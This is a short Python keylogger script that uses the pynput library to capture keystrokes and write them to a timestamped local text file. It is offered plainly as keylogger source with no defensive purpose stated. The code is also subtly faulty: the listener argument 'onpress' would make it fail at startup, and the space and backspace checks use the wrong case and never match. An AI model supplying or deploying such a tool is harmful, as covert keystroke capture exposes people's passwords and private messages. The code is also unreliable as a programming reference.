import datetime
from pynput.keyboard import Listener

date = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

format = open('Keylogger {}.txt'.format(date), 'w')

def key_recorder(key):
    key = str(key)
    
    if key == 'Key.enter':
        format.write('\n')
    elif key == 'key.space':
        format.write(' ')
    elif key == 'key.backspace':
        format.write('%DELETE%')
    else:
        format.write(key.replace("'", ""))
    
with Listener(onpress = key_recorder) as l:
    l.join()